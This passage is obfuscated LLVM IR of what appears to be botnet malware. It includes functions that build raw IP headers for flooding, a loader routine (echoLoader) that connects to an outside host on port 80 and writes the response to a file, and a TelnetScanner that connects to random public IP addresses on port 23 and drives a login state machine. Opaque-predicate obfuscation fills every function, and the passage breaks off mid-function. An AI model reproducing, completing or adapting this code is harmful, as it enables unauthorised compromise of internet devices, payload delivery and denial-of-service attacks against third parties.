  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %23

; <label>:6:                                      ; preds = %1
  %7 = load i32, i32* @x.61
  %8 = load i32, i32* @y.62
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  store i32 1, i32* %2, align 4
  %15 = load i32, i32* @x.61
  %16 = load i32, i32* @y.62
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %42

; <label>:23:                                     ; preds = %1
  %24 = load i32, i32* @x.61
  %25 = load i32, i32* @y.62
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* %3, align 4
  %33 = call i32 @close(i32 %32)
  store i32 0, i32* %2, align 4
  %34 = load i32, i32* @x.61
  %35 = load i32, i32* @y.62
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %originalBBpart2
  %43 = load i32, i32* @x.61
  %44 = load i32, i32* @y.62
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %51 = load i32, i32* %2, align 4
  %52 = load i32, i32* @x.61
  %53 = load i32, i32* @y.62
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %51

originalBBalteredBB:                              ; preds = %originalBB, %6
  store i32 1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %60 = load i32, i32* %3, align 4
  %61 = call i32 @close(i32 %60)
  store i32 0, i32* %2, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %62 = load i32, i32* %2, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i16, align 2
  %5 = alloca %struct.hostent*, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i16 %1, i16* %4, align 2
  store i32 1, i32* %7, align 4
  %9 = load i8*, i8** %3, align 8
  %10 = call %struct.hostent* @gethostbyname(i8* %9)
  store %struct.hostent* %10, %struct.hostent** %5, align 8
  %11 = icmp eq %struct.hostent* %10, null
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0)) #2
  call void @exit(i32 1) #14
  unreachable

; <label>:13:                                     ; preds = %2
  %14 = load %struct.hostent*, %struct.hostent** %5, align 8
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %14, i32 0, i32 4
  %16 = load i8**, i8*** %15, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %20 = bitcast %struct.in_addr* %19 to i8*
  %21 = load %struct.hostent*, %struct.hostent** %5, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 3
  %23 = load i32, i32* %22, align 4
  %24 = sext i32 %23 to i64
  call void @bcopy(i8* %18, i8* %20, i64 %24) #2
  %25 = load i16, i16* %4, align 2
  %26 = call zeroext i16 @htons(i16 zeroext %25) #13
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %26, i16* %27, align 2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  %31 = bitcast i32* %7 to i8*
  %32 = call i32 @setsockopt(i32 %30, i32 6, i32 1, i8* %31, i32 4) #2
  %33 = load i32, i32* %8, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %52

; <label>:35:                                     ; preds = %13
  %36 = load i32, i32* @x.63
  %37 = load i32, i32* @y.64
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i32 0, i32 0))
  call void @exit(i32 1) #14
  %44 = load i32, i32* @x.63
  %45 = load i32, i32* @y.64
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:52:                                     ; preds = %13
  %53 = load i32, i32* %8, align 4
  %54 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %55 = call i32 @connect(i32 %53, %struct.sockaddr* %54, i32 16)
  %56 = icmp eq i32 %55, -1
  br i1 %56, label %57, label %74

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* @x.63
  %59 = load i32, i32* @y.64
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0))
  call void @exit(i32 1) #14
  %66 = load i32, i32* @x.63
  %67 = load i32, i32* @y.64
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:74:                                     ; preds = %52
  %75 = load i32, i32* @x.63
  %76 = load i32, i32* @y.64
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %83 = load i32, i32* %8, align 4
  %84 = load i32, i32* @x.63
  %85 = load i32, i32* @y.64
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %83

originalBBalteredBB:                              ; preds = %originalBB, %35
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.48, i32 0, i32 0))
  call void @exit(i32 1) #14
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0))
  call void @exit(i32 1) #14
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  %92 = load i32, i32* %8, align 4
  br label %originalBB6
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @herror(i8*) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare void @perror(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @echoLoader() #0 {
  %1 = alloca [512 x i8], align 16
  %2 = alloca i32, align 4
  %3 = alloca %struct._IO_FILE*, align 8
  %4 = call i32 @socket_connect(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i16 zeroext 80)
  store i32 %4, i32* %2, align 4
  %5 = load i32, i32* %2, align 4
  %6 = call i64 @write(i32 %5, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.51, i32 0, i32 0), i64 13)
  %7 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 512, i32 16, i1 false)
  br label %8

; <label>:8:                                      ; preds = %originalBBpart2, %0
  %9 = load i32, i32* %2, align 4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %11 = call i64 @read(i32 %9, i8* %10, i64 511)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %37

; <label>:13:                                     ; preds = %8
  %14 = load i32, i32* @x.65
  %15 = load i32, i32* @y.66
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0))
  store %struct._IO_FILE* %22, %struct._IO_FILE** %3, align 8
  %23 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %25 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %23, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* %24)
  %26 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %27 = call i32 @fclose(%struct._IO_FILE* %26)
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 512, i32 16, i1 false)
  %29 = load i32, i32* @x.65
  %30 = load i32, i32* @y.66
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %8

; <label>:37:                                     ; preds = %8
  %38 = load i32, i32* @x.65
  %39 = load i32, i32* @y.66
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %37
  %46 = load i32, i32* %2, align 4
  %47 = call i32 @shutdown(i32 %46, i32 2) #2
  %48 = load i32, i32* %2, align 4
  %49 = call i32 @close(i32 %48)
  %50 = load i32, i32* @x.65
  %51 = load i32, i32* @y.66
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %13
  %58 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0))
  store %struct._IO_FILE* %58, %struct._IO_FILE** %3, align 8
  %59 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  %61 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %59, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* %60)
  %62 = load %struct._IO_FILE*, %struct._IO_FILE** %3, align 8
  %63 = call i32 @fclose(%struct._IO_FILE* %62)
  %64 = getelementptr inbounds [512 x i8], [512 x i8]* %1, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 512, i32 16, i1 false)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %65 = load i32, i32* %2, align 4
  %66 = call i32 @shutdown(i32 %65, i32 2) #2
  %67 = load i32, i32* %2, align 4
  %68 = call i32 @close(i32 %67)
  br label %originalBB1
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @shutdown(i32, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner() #0 {
  %1 = load i32, i32* @x.67
  %2 = load i32, i32* @y.68
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i8*, align 8
  %18 = alloca %struct.timeval, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 4
  %24 = mul nsw i32 %23, 3
  store i32 %24, i32* %9, align 4
  %25 = load i32, i32* %9, align 4
  %26 = icmp sgt i32 %25, 512
  %27 = load i32, i32* @x.67
  %28 = load i32, i32* @y.68
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %36

; <label>:35:                                     ; preds = %originalBBpart2
  br label %38

; <label>:36:                                     ; preds = %originalBBpart2
  %37 = load i32, i32* %9, align 4
  br label %38

; <label>:38:                                     ; preds = %36, %35
  %39 = phi i32 [ 512, %35 ], [ %37, %36 ]
  store i32 %39, i32* %9, align 4
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %40, align 4
  %41 = call zeroext i16 @htons(i16 zeroext 23) #13
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %41, i16* %42, align 2
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %9, align 4
  %46 = zext i32 %45 to i64
  %47 = call i8* @llvm.stacksave()
  store i8* %47, i8** %17, align 8
  %48 = alloca %struct.telstate_t, i64 %46, align 16
  %49 = bitcast %struct.telstate_t* %48 to i8*
  %50 = load i32, i32* %9, align 4
  %51 = sext i32 %50 to i64
  %52 = mul i64 %51, 5
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 %52, i32 16, i1 false)
  store i32 0, i32* %10, align 4
  br label %53

; <label>:53:                                     ; preds = %72, %38
  %54 = load i32, i32* %10, align 4
  %55 = load i32, i32* %9, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %10, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %59
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %60, i32 0, i32 3
  store i8 1, i8* %61, align 1
  %62 = call noalias i8* @malloc(i64 1024) #2
  %63 = load i32, i32* %10, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %64
  %66 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %65, i32 0, i32 8
  store i8* %62, i8** %66, align 8
  %67 = load i32, i32* %10, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %68
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %69, i32 0, i32 8
  %71 = load i8*, i8** %70, align 8
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 1024, i32 1, i1 false)
  br label %72

; <label>:72:                                     ; preds = %57
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %10, align 4
  br label %53

; <label>:75:                                     ; preds = %53
  %76 = call i32 @system(i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.55, i32 0, i32 0))
  %77 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 0
  store i64 5, i64* %77, align 8
  %78 = getelementptr inbounds %struct.timeval, %struct.timeval* %18, i32 0, i32 1
  store i64 0, i64* %78, align 8
  br label %79

; <label>:79:                                     ; preds = %3363, %75
  %80 = load i32, i32* @x.67
  %81 = load i32, i32* @y.68
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %79
  %88 = load i32, i32* @x.67
  %89 = load i32, i32* @y.68
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %96

; <label>:96:                                     ; preds = %originalBBpart218
  store i32 0, i32* %10, align 4
  br label %97

; <label>:97:                                     ; preds = %originalBBpart2350, %96
  %98 = load i32, i32* %10, align 4
  %99 = load i32, i32* %9, align 4
  %100 = icmp slt i32 %98, %99
  br i1 %100, label %101, label %3363

; <label>:101:                                    ; preds = %97
  %102 = load i32, i32* %10, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %103
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %104, i32 0, i32 2
  %106 = load i8, i8* %105, align 8
  %107 = zext i8 %106 to i32
  switch i32 %107, label %3327 [
    i32 0, label %108
    i32 1, label %313
    i32 2, label %551
    i32 3, label %1070
    i32 4, label %1138
    i32 5, label %1643
    i32 6, label %1759
    i32 7, label %2813
    i32 8, label %2841
    i32 9, label %2917
    i32 10, label %2987
    i32 11, label %2998
    i32 12, label %3042
  ]

; <label>:108:                                    ; preds = %101
  %109 = load i32, i32* %10, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 8
  %113 = load i8*, i8** %112, align 8
  call void @llvm.memset.p0i8.i64(i8* %113, i8 0, i64 1024, i32 1, i1 false)
  %114 = load i32, i32* %10, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %115
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %116, i32 0, i32 3
  %118 = load i8, i8* %117, align 1
  %119 = icmp ne i8 %118, 0
  br i1 %119, label %120, label %140

; <label>:120:                                    ; preds = %108
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 8
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %19, align 8
  %126 = load i32, i32* %10, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %127
  %129 = bitcast %struct.telstate_t* %128 to i8*
  call void @llvm.memset.p0i8.i64(i8* %129, i8 0, i64 32, i32 16, i1 false)
  %130 = load i8*, i8** %19, align 8
  %131 = load i32, i32* %10, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 8
  store i8* %130, i8** %134, align 8
  %135 = call i32 @getRandomPublicIP()
  %136 = load i32, i32* %10, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 1
  store i32 %135, i32* %139, align 4
  br label %195

; <label>:140:                                    ; preds = %108
  %141 = load i32, i32* @x.67
  %142 = load i32, i32* @y.68
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %140
  %149 = load i32, i32* %10, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %150
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %151, i32 0, i32 5
  %153 = load i8, i8* %152, align 1
  %154 = add i8 %153, 1
  store i8 %154, i8* %152, align 1
  %155 = load i32, i32* %10, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 5
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i64
  %161 = icmp eq i64 %160, 13
  %162 = load i32, i32* @x.67
  %163 = load i32, i32* @y.68
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart224, label %originalBB20alteredBB

originalBBpart224:                                ; preds = %originalBB20
  br i1 %161, label %170, label %181

; <label>:170:                                    ; preds = %originalBBpart224
  %171 = load i32, i32* %10, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 5
  store i8 0, i8* %174, align 1
  %175 = load i32, i32* %10, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 4
  %179 = load i8, i8* %178, align 2
  %180 = add i8 %179, 1
  store i8 %180, i8* %178, align 2
  br label %181

; <label>:181:                                    ; preds = %170, %originalBBpart224
  %182 = load i32, i32* %10, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %183
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %184, i32 0, i32 4
  %186 = load i8, i8* %185, align 2
  %187 = zext i8 %186 to i64
  %188 = icmp eq i64 %187, 4
  br i1 %188, label %189, label %194

; <label>:189:                                    ; preds = %181
  %190 = load i32, i32* %10, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 3
  store i8 1, i8* %193, align 1
  br label %3344

; <label>:194:                                    ; preds = %181
  br label %195

; <label>:195:                                    ; preds = %194, %120
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %196, align 4
  %197 = call zeroext i16 @htons(i16 zeroext 23) #13
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %197, i16* %198, align 2
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %200 = getelementptr inbounds [8 x i8], [8 x i8]* %199, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 8, i32 4, i1 false)
  %201 = load i32, i32* %10, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %202
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %203, i32 0, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %207 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %206, i32 0, i32 0
  store i32 %205, i32* %207, align 4
  %208 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %209 = load i32, i32* %10, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  store i32 %208, i32* %212, align 16
